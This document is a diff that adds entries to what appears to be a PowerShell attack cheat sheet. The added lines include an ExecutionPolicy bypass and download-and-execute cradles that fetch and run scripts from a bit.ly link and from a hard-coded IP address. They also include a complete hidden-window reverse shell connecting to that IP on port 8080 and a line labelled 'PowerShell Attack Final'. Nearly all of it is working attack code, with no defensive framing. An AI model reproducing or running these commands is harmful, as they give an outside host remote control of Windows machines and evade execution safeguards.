@@ -26,4 +26,17 @@ do{
 }While (!$out.equals("exit"))
 $writer.close();$socket.close();
 
+=> Bypass ExecutionPolicy = Read the script to other shell
+Get-Content .runme.ps1 | PowerShell.exe -noprofile - 
+
+=> Executing PS remotly bypassing ExecutionPolicy
+powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
+
+
+
+============
 PowerShell.exe -windowstyle hidden { $client = New-Object System.Net.Sockets.TCPClient("207.154.217.178",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() }
+
+============
+=> PowerShell Attack Final
+PowerShell.exe -windowstyle hidden -nop -c "iex(New-Object Net.WebClient).DownloadString('http://207.154.217.178/exec.ps1')"
